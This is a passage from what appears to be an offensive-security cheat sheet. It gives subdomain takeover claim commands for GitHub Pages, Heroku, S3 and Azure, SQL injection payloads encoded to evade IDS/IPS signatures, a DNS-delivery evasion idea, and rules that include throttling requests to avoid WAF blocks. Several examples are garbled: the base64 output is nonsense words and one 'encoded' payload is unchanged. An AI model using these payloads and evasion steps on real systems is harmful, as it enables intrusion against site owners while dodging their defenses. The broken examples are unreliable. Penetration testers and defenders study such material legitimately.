### Fingerprint Bypass

```
When CDN/WAF returns fixed error page:
1. Check CNAME → points to unclaimed service → vulnerable
2. Check TXT record → DNS validation possible
3. Check subdomain takes different paths

Provider-specific bypasses:
GitHub Pages:
- Custom domain still shows "There isn't a GitHub Pages site here"
- Register at github.com
- GitHub Pages returns 404 for non-existent repo but 200 for repo with no index.html

Heroku:
- Check for herokuapp.com
- Claim: heroku create same-name-app

S3:
- Check bucket name matches subdomain
- Claim: aws s3 mb s3://subdomain.target.com
- Or use different region

Azure Blob:
- Check CNAME to blob.core.windows.net
- Claim at Azure portal
```

---

## IDS/IPS BYPASS TECHNIQUES

### Signature Obfuscation

```python
# Bad chars encoded
# Spaces: +, %20, %09, %0d%0a, comments, whitespace
# Quotes: '', \", %22, %27
# Parentheses: %28, %29, %5b%5d
# Operators: %3d, %3c, %3e, %21, %26, %7c

# Numeric encoding
' OR 1=1→' OR 1=1
' OR 1=1# → '\x00OR 1=1#  (null byte)
' OR 1=1-- → '\u0027 OR \u0031\u003d\u0031--  (unicode)

# Hex encoding of entire query
' UNION SELECT username FROM users--
→ \x27\x20UNION\x20SELECT\x20username\x20FROM\x20users--

# Base64
echo "' UNION SELECT username FROM users--" | base64
→ 'V pretreatmentV username nucleus universe...'

# Time bomb: deliver payload via DNS
# IDS sees DNS query, not SQLi in HTTP request
```

---

## FINAL BYPASS MASTER RULES

1. **Always test in Burp first** — don't blast payloads at production
2. **Progression order** — basic → encoding → bypass → chained
3. **Document what worked** — build your personal bypass library
4. **Understand the filter** — analyze what characters/strings are blocked
5. **Chain bypasses** — combine multiple techniques
6. **Verify before reporting** — ensure payload actually executes
7. **Rate limit** — avoid triggering WAF/IDS block
8. **Context matters** — payload success depends on exact insertion point
9. **Multi-layer filters** — try bypassing each layer independently
10. **Never trust automation** — manual testing finds what scanners miss
